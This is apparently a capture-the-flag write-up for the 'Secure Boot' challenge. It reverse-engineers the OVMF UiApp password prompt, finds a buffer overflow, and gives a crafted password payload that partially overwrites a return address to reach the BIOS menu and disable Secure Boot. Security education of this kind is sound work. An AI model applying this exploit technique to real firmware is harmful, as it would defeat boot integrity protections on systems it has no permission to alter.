# Secure Boot
> Solves: 26

The goal of the challenge is very clear, just boot the machine successfully.
* <span>run.py</span>:
```python
#!/usr/bin/python3
import os
import tempfile

fname = tempfile.NamedTemporaryFile().name

os.system("cp OVMF.fd %s" % (fname))
os.system("chmod u+w %s" % (fname))
os.system("qemu-system-x86_64 -s -monitor /dev/null -m 128M -drive if=pflash,format=raw,file=%s -drive file=fat:rw:contents,format=raw -net none -nographic 2> /dev/null" % (fname))
os.system("rm -rf %s" % (fname))
```
But this machine was enabled Secure Boot Configuration, thus if boot it directly, we will get this messege:
```
UEFI Interactive Shell v2.2
EDK II
UEFI v2.70 (EDK II, 0x00010000)

...

Booting...
Script Error Status: Security Violation (line number 5)
```
Try some hotkey like `ESC`, it will enter the BIOS interface and ask for the password:
```
BdsDxe: loading Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
BdsDxe: starting Boot0000 "UiApp" from Fv(7CB8BDC9-F8EB-4F34-AAEA-3EE4AF6516A1)/FvFile(462CAA21-7614-4503-836E-8AB6F4662331)
****************************
*                          *
*   Welcome to the BIOS!   *
*                          *
****************************

Password?
```
* Use `uefi-firmware-parser` to extract dll files from `OVMF.fd`:
```shell=
sudo pip install uefi_firmware
uefi-firmware-parser ./OVMF.fd -e
```
We'll get several dll files:
```
/home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/MdeModulePkg/Application/UiApp/UiApp/DEBUG/UiApp.dll
/home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/MdeModulePkg/Universal/BdsDxe/BdsDxe/DEBUG/BdsDxe.dll
/home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/OvmfPkg/Sec/SecMain/DEBUG/SecMain.dll
...
```
First check out the `UiApp.dll` for reversing BIOS. There is a simple overflow, password buffer has the length 0x80 byte, but we are able to input 0x8b byte to it, it can just right overwrite the data pointer for 4 byte.

### PoC
* Password: `a` * 0x8a

![](https://i.imgur.com/O5HVnMP.png)


For now, we can write everywhere and also get the image base of UiApp.dll from crash messege. We decided to overwrite some function pointer to continue booting, but the content to write was uncontrollable, it like the hash value of the password.
Finally we decided to find the password which last byte of hash is nearby enough offset, return address is at `0x7ec18b8`, we overwrite the pointer with `0x7ec18b8 - 0x20 + 1` to overflow the return address for just one byte.
For this password payload:
```python
p = '\x05' * 0x20
p = p.ljust( 0x20 , '\x01' )
p = p.ljust( 0x88 , 'a' )
p += p32( 0x7ec18b8 - 0x20 + 1 )
```
the last byte of hash value of this password is `\x13`, and the original return address is `0x67d4d34`. We overflow it to let it become `0x67d4d13`:
```nasm
   0x67d4d13:	sbb    BYTE PTR [rcx],al
   0x67d4d15:	add    dh,al
   0x67d4d17:	add    eax,0x11dfc
   0x67d4d1c:	add    DWORD PTR [rcx+0x11e9d05],ecx
   0x67d4d22:	add    BYTE PTR [rbx+0x118a705],cl
   0x67d4d28:	add    BYTE PTR [rcx+0x11e8d05],cl
   0x67d4d2e:	add    al,ch
   0x67d4d30:	sbb    al,0x61
   0x67d4d32:	add    BYTE PTR [rax],al
   0x67d4d34:	test   al,al
   0x67d4d36:	jne    0x67d4d49
   0x67d4d38:	lea    rcx,[rip+0xa11f]        # 0x67dee5e
   0x67d4d3f:	call   0x67cc3fd
   0x67d4d44:	jmp    0x67d5eb6
=> 0x67d4d49:	cmp    BYTE PTR [rip+0x11e00],0x0        # 0x67e6b50
```
It didn't crash, that was awesome! The `al` was not zero now, so that it will bypass `test al,al` checking and took the branch at `jne    0x67d4d49` then entered the BIOS.
For now, just use some control keys `UP DOWN LEFT RIGHT` to control the BIOS interface.
Disable Secure Boot Configuration, and reset:
* Enter Device Manager
![](https://i.imgur.com/EWx5VU0.png)
* Enter Secure Boot Configuration
![](https://i.imgur.com/7ybGzs7.png)
* Disable it!
![](https://i.imgur.com/YVg0Rjq.png)
* Enjoty the machine.
![](https://i.imgur.com/OIIsQfS.png)

Flag: `CTF{pl4y1ng_with_v1rt_3F1_just_4fun}`